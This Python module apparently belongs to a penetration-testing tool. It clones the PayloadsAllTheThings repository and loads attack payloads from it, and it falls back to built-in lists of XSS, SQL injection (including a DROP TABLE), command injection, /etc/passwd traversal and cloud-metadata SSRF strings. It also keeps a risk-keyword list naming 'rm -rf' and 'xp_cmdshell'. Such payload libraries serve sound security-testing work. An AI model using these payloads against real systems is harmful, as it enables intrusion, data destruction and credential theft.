#!/usr/bin/env python3
"""
PayloadsAllTheThings Security Adapter för Sparkling-Owl-Spin
Integration med PayloadsAllTheThings för penetration testing payloads
"""

import logging
import asyncio
import os
import json
import yaml
from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass
from enum import Enum
from datetime import datetime
import re

logger = logging.getLogger(__name__)

class PayloadCategory(Enum):
    """Payload categories"""
    XSS = "Cross-Site Scripting (XSS)"
    SQLI = "SQL Injection"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Directory Traversal"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    SSRF = "Server-Side Request Forgery"
    XXE = "XML External Entity"
    SSTI = "Server-Side Template Injection"
    CSTI = "Client-Side Template Injection"
    LDAP_INJECTION = "LDAP Injection"
    NOSQL_INJECTION = "NoSQL Injection"
    XPATH_INJECTION = "XPath Injection"
    CRLF_INJECTION = "CRLF Injection"
    HTTP_RESPONSE_SPLITTING = "HTTP Response Splitting"
    OPEN_REDIRECT = "Open Redirect"
    CSRF = "Cross-Site Request Forgery"
    CLICKJACKING = "Clickjacking"
    BUSINESS_LOGIC = "Business Logic Vulnerabilities"
    
@dataclass
class Payload:
    """Security payload"""
    content: str
    category: PayloadCategory
    description: str
    context: str  # Where to use this payload
    encoded: bool = False
    risk_level: str = "medium"  # low, medium, high, critical
    tags: List[str] = None
    
@dataclass
class PayloadSet:
    """Set of related payloads"""
    name: str
    category: PayloadCategory
    payloads: List[Payload]
    description: str
    target_contexts: List[str]
    
@dataclass
class TestResult:
    """Payload test result"""
    payload: Payload
    target_url: str
    response_code: int
    response_time: float
    response_length: int
    detected: bool
    error_indicators: List[str]
    success_indicators: List[str]
    timestamp: datetime

class PayloadsAllTheThingsAdapter:
    """PayloadsAllTheThings integration för security testing"""
    
    def __init__(self, plugin_info):
        self.plugin_info = plugin_info
        self.payloads_repo_path = None
        self.payload_sets = {}
        self.custom_payloads = {}
        self.initialized = False
        self.git_available = False
        
    async def initialize(self):
        """Initiera PayloadsAllTheThings adapter"""
        try:
            logger.info("🔐 Initializing PayloadsAllTheThings Adapter")
            
            # Check Git availability
            await self._check_git_availability()
            
            # Setup payload repository
            await self._setup_payload_repository()
            
            # Load payload sets
            await self._load_payload_sets()
            
            self.initialized = True
            logger.info("✅ PayloadsAllTheThings Adapter initialized")
            
        except Exception as e:
            logger.error(f"❌ Failed to initialize PayloadsAllTheThings: {str(e)}")
            raise
            
    async def _check_git_availability(self):
        """Check if Git is available"""
        try:
            result = await asyncio.create_subprocess_exec(
                'git', '--version',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await result.communicate()
            
            if result.returncode == 0:
                git_version = stdout.decode().strip()
                logger.info(f"✅ Git available: {git_version}")
                self.git_available = True
            else:
                logger.warning("⚠️ Git not available")
                self.git_available = False
                
        except Exception as e:
            logger.warning(f"⚠️ Error checking Git: {str(e)}")
            self.git_available = False
            
    async def _setup_payload_repository(self):
        """Setup PayloadsAllTheThings repository"""
        repo_url = "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
        self.payloads_repo_path = "./payloads_repo"
        
        if self.git_available:
            if not os.path.exists(self.payloads_repo_path):
                logger.info("📥 Cloning PayloadsAllTheThings repository...")
                result = await asyncio.create_subprocess_exec(
                    'git', 'clone', repo_url, self.payloads_repo_path,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await result.communicate()
                
                if result.returncode == 0:
                    logger.info("✅ PayloadsAllTheThings repository cloned")
                else:
                    logger.error(f"❌ Failed to clone repository: {stderr.decode()}")
                    self.payloads_repo_path = None
            else:
                logger.info("📂 Using existing PayloadsAllTheThings repository")
                # Update repository
                await self._update_repository()
        else:
            logger.warning("⚠️ Git not available - using built-in payloads only")
            self.payloads_repo_path = None
            
    async def _update_repository(self):
        """Update PayloadsAllTheThings repository"""
        if not self.payloads_repo_path or not os.path.exists(self.payloads_repo_path):
            return
            
        try:
            result = await asyncio.create_subprocess_exec(
                'git', 'pull',
                cwd=self.payloads_repo_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await result.communicate()
            
            if result.returncode == 0:
                logger.info("🔄 PayloadsAllTheThings repository updated")
            else:
                logger.warning(f"⚠️ Failed to update repository: {stderr.decode()}")
                
        except Exception as e:
            logger.warning(f"⚠️ Error updating repository: {str(e)}")
            
    async def _load_payload_sets(self):
        """Load payload sets"""
        if self.payloads_repo_path and os.path.exists(self.payloads_repo_path):
            await self._load_from_repository()
        else:
            await self._load_builtin_payloads()
            
    async def _load_from_repository(self):
        """Load payloads från repository"""
        try:
            # Load XSS payloads
            xss_path = os.path.join(self.payloads_repo_path, "XSS Injection")
            if os.path.exists(xss_path):
                await self._load_category_payloads(xss_path, PayloadCategory.XSS)
                
            # Load SQL Injection payloads
            sqli_path = os.path.join(self.payloads_repo_path, "SQL Injection")
            if os.path.exists(sqli_path):
                await self._load_category_payloads(sqli_path, PayloadCategory.SQLI)
                
            # Load other categories...
            categories = [
                ("Command Injection", PayloadCategory.COMMAND_INJECTION),
                ("Directory Traversal", PayloadCategory.PATH_TRAVERSAL),
                ("File Inclusion", PayloadCategory.LFI),
                ("Server Side Request Forgery", PayloadCategory.SSRF),
                ("XXE Injection", PayloadCategory.XXE),
                ("Template Injection", PayloadCategory.SSTI),
                ("LDAP Injection", PayloadCategory.LDAP_INJECTION),
                ("NoSQL Injection", PayloadCategory.NOSQL_INJECTION),
                ("XPath Injection", PayloadCategory.XPATH_INJECTION)
            ]
            
            for dir_name, category in categories:
                category_path = os.path.join(self.payloads_repo_path, dir_name)
                if os.path.exists(category_path):
                    await self._load_category_payloads(category_path, category)
                    
            logger.info(f"📋 Loaded {len(self.payload_sets)} payload categories from repository")
            
        except Exception as e:
            logger.error(f"❌ Error loading payloads från repository: {str(e)}")
            await self._load_builtin_payloads()
            
    async def _load_category_payloads(self, category_path: str, category: PayloadCategory):
        """Load payloads för specific category"""
        payloads = []
        
        # Look for README.md files with payload lists
        for root, dirs, files in os.walk(category_path):
            for file in files:
                if file.lower() in ['readme.md', 'payloads.txt', 'payload.txt']:
                    file_path = os.path.join(root, file)
                    category_payloads = await self._parse_payload_file(file_path, category)
                    payloads.extend(category_payloads)
                    
        if payloads:
            payload_set = PayloadSet(
                name=category.value,
                category=category,
                payloads=payloads,
                description=f"Payloads för {category.value}",
                target_contexts=self._get_target_contexts(category)
            )
            self.payload_sets[category] = payload_set
            
    async def _parse_payload_file(self, file_path: str, category: PayloadCategory) -> List[Payload]:
        """Parse payload file"""
        payloads = []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            # Extract payloads from markdown code blocks
            code_blocks = re.findall(r'```(?:\w+)?\n(.*?)\n```', content, re.DOTALL)
            
            for block in code_blocks:
                lines = block.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#') and not line.startswith('//'):
                        payload = Payload(
                            content=line,
                            category=category,
                            description=f"{category.value} payload",
                            context=self._determine_context(line, category),
                            risk_level=self._determine_risk_level(line, category),
                            tags=[category.name.lower()]
                        )
                        payloads.append(payload)
                        
        except Exception as e:
            logger.error(f"❌ Error parsing payload file {file_path}: {str(e)}")
            
        return payloads[:50]  # Limit to 50 payloads per file
        
    async def _load_builtin_payloads(self):
        """Load built-in payloads när repository inte är available"""
        logger.info("📋 Loading built-in payloads")
        
        # XSS Payloads
        xss_payloads = [
            Payload("<script>alert('XSS')</script>", PayloadCategory.XSS, "Basic XSS", "html"),
            Payload("<img src=x onerror=alert('XSS')>", PayloadCategory.XSS, "Image XSS", "html"),
            Payload("javascript:alert('XSS')", PayloadCategory.XSS, "JavaScript protocol", "href"),
            Payload("'><script>alert('XSS')</script>", PayloadCategory.XSS, "Attribute escape XSS", "attribute"),
            Payload("\"><script>alert('XSS')</script>", PayloadCategory.XSS, "Double quote escape", "attribute"),
            Payload("<svg onload=alert('XSS')>", PayloadCategory.XSS, "SVG XSS", "html"),
            Payload("<iframe src=javascript:alert('XSS')>", PayloadCategory.XSS, "Iframe XSS", "html"),
        ]
        
        # SQL Injection Payloads
        sqli_payloads = [
            Payload("' OR '1'='1", PayloadCategory.SQLI, "Basic boolean SQL injection", "parameter"),
            Payload("' UNION SELECT NULL--", PayloadCategory.SQLI, "UNION-based SQLi", "parameter"),
            Payload("'; DROP TABLE users;--", PayloadCategory.SQLI, "Destructive SQLi", "parameter", risk_level="critical"),
            Payload("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", PayloadCategory.SQLI, "Information schema", "parameter"),
            Payload("' OR 1=1#", PayloadCategory.SQLI, "MySQL comment", "parameter"),
            Payload("'; WAITFOR DELAY '00:00:05'--", PayloadCategory.SQLI, "Time-based SQLi", "parameter"),
            Payload("' OR 'x'='x", PayloadCategory.SQLI, "String comparison", "parameter"),
        ]
        
        # Command Injection Payloads
        cmd_payloads = [
            Payload("; ls", PayloadCategory.COMMAND_INJECTION, "Basic command injection", "parameter"),
            Payload("| whoami", PayloadCategory.COMMAND_INJECTION, "Pipe command", "parameter"),
            Payload("&& dir", PayloadCategory.COMMAND_INJECTION, "Windows command", "parameter"),
            Payload("; cat /etc/passwd", PayloadCategory.COMMAND_INJECTION, "Linux file read", "parameter", risk_level="high"),
            Payload("`id`", PayloadCategory.COMMAND_INJECTION, "Backtick execution", "parameter"),
            Payload("$(whoami)", PayloadCategory.COMMAND_INJECTION, "Command substitution", "parameter"),
        ]
        
        # Path Traversal Payloads
        traversal_payloads = [
            Payload("../../../etc/passwd", PayloadCategory.PATH_TRAVERSAL, "Linux passwd file", "path"),
            Payload("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", PayloadCategory.PATH_TRAVERSAL, "Windows hosts file", "path"),
            Payload("....//....//....//etc/passwd", PayloadCategory.PATH_TRAVERSAL, "Double encoding", "path"),
            Payload("..%2F..%2F..%2Fetc%2Fpasswd", PayloadCategory.PATH_TRAVERSAL, "URL encoded", "path"),
            Payload("..%252F..%252F..%252Fetc%252Fpasswd", PayloadCategory.PATH_TRAVERSAL, "Double URL encoded", "path"),
        ]
        
        # SSRF Payloads
        ssrf_payloads = [
            Payload("http://127.0.0.1:22", PayloadCategory.SSRF, "Localhost SSH", "url"),
            Payload("http://localhost:3306", PayloadCategory.SSRF, "MySQL port", "url"),
            Payload("file:///etc/passwd", PayloadCategory.SSRF, "Local file", "url", risk_level="high"),
            Payload("http://169.254.169.254/", PayloadCategory.SSRF, "AWS metadata", "url", risk_level="high"),
            Payload("gopher://127.0.0.1:3306/", PayloadCategory.SSRF, "Gopher protocol", "url"),
        ]
        
        # Create payload sets
        payload_categories = [
            (PayloadCategory.XSS, xss_payloads),
            (PayloadCategory.SQLI, sqli_payloads),
            (PayloadCategory.COMMAND_INJECTION, cmd_payloads),
            (PayloadCategory.PATH_TRAVERSAL, traversal_payloads),
            (PayloadCategory.SSRF, ssrf_payloads)
        ]
        
        for category, payloads in payload_categories:
            payload_set = PayloadSet(
                name=category.value,
                category=category,
                payloads=payloads,
                description=f"Built-in payloads för {category.value}",
                target_contexts=self._get_target_contexts(category)
            )
            self.payload_sets[category] = payload_set
            
        logger.info(f"✅ Loaded {len(self.payload_sets)} built-in payload categories")
        
    def _get_target_contexts(self, category: PayloadCategory) -> List[str]:
        """Get target contexts för category"""
        context_map = {
            PayloadCategory.XSS: ["html", "attribute", "href", "javascript", "css"],
            PayloadCategory.SQLI: ["parameter", "header", "cookie", "post_data"],
            PayloadCategory.COMMAND_INJECTION: ["parameter", "header", "filename"],
            PayloadCategory.PATH_TRAVERSAL: ["path", "filename", "parameter"],
            PayloadCategory.SSRF: ["url", "parameter", "redirect"],
            PayloadCategory.LFI: ["path", "filename", "include"],
            PayloadCategory.XXE: ["xml", "soap", "post_data"],
            PayloadCategory.SSTI: ["template", "parameter", "header"]
        }
        return context_map.get(category, ["parameter"])
        
    def _determine_context(self, payload_content: str, category: PayloadCategory) -> str:
        """Determine context för payload"""
        if category == PayloadCategory.XSS:
            if payload_content.startswith('<'):
                return "html"
            elif 'javascript:' in payload_content:
                return "href"
            elif payload_content.startswith("'") or payload_content.startswith('"'):
                return "attribute"
        elif category == PayloadCategory.SQLI:
            return "parameter"
        elif category == PayloadCategory.PATH_TRAVERSAL:
            return "path"
        elif category == PayloadCategory.SSRF:
            if payload_content.startswith(('http://', 'https://', 'ftp://', 'file://')):
                return "url"
                
        return "parameter"
        
    def _determine_risk_level(self, payload_content: str, category: PayloadCategory) -> str:
        """Determine risk level för payload"""
        high_risk_indicators = [
            'DROP TABLE', 'DELETE FROM', '/etc/passwd', 'system32', 'cmd.exe',
            'file:///', 'WAITFOR DELAY', 'xp_cmdshell'
        ]
        
        critical_risk_indicators = [
            'DROP DATABASE', 'TRUNCATE', 'shutdown', 'format c:', 'rm -rf'
        ]
        
        payload_upper = payload_content.upper()
        
        for indicator in critical_risk_indicators:
            if indicator.upper() in payload_upper:
                return "critical"
                
        for indicator in high_risk_indicators:
            if indicator.upper() in payload_upper:
                return "high"
                
        if category in [PayloadCategory.SQLI, PayloadCategory.COMMAND_INJECTION]:
            return "medium"
            
        return "low"
        
    def get_payloads(self, category: PayloadCategory, context: str = None, 
                    risk_level: str = None, limit: int = None) -> List[Payload]:
        """Get payloads för specific category"""
        if category not in self.payload_sets:
            return []
            
        payloads = self.payload_sets[category].payloads
        
        # Filter by context
        if context:
            payloads = [p for p in payloads if p.context == context]
            
        # Filter by risk level
        if risk_level:
            payloads = [p for p in payloads if p.risk_level == risk_level]
            
        # Limit results
        if limit:
            payloads = payloads[:limit]
            
        return payloads
        
    def get_all_categories(self) -> List[PayloadCategory]:
        """Get all available payload categories"""
        return list(self.payload_sets.keys())
        
    def search_payloads(self, query: str, category: PayloadCategory = None) -> List[Payload]:
        """Search payloads by content or description"""
        results = []
        
        categories_to_search = [category] if category else self.payload_sets.keys()
        
        for cat in categories_to_search:
            if cat not in self.payload_sets:
                continue
                
            for payload in self.payload_sets[cat].payloads:
                if (query.lower() in payload.content.lower() or 
                    query.lower() in payload.description.lower()):
                    results.append(payload)
                    
        return results
        
    def add_custom_payload(self, payload: Payload, category: PayloadCategory):
        """Add custom payload"""
        if category not in self.custom_payloads:
            self.custom_payloads[category] = []
            
        self.custom_payloads[category].append(payload)
        logger.info(f"➕ Added custom payload to {category.value}")
        
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get payload statistics"""
        total_payloads = sum(len(ps.payloads) for ps in self.payload_sets.values())
        custom_payloads = sum(len(payloads) for payloads in self.custom_payloads.values())
        
        category_counts = {
            category.value: len(payload_set.payloads) 
            for category, payload_set in self.payload_sets.items()
        }
        
        risk_distribution = {}
        for payload_set in self.payload_sets.values():
            for payload in payload_set.payloads:
                risk_distribution[payload.risk_level] = risk_distribution.get(payload.risk_level, 0) + 1
                
        return {
            "total_payloads": total_payloads,
            "custom_payloads": custom_payloads,
            "categories": len(self.payload_sets),
            "category_distribution": category_counts,
            "risk_distribution": risk_distribution,
            "repository_available": self.payloads_repo_path is not None
        }
        
    async def cleanup(self):
        """Cleanup PayloadsAllTheThings adapter"""
        logger.info("🧹 Cleaning up PayloadsAllTheThings Adapter")
        self.payload_sets.clear()
        self.custom_payloads.clear()
        self.initialized = False
        logger.info("✅ PayloadsAllTheThings Adapter cleanup completed")
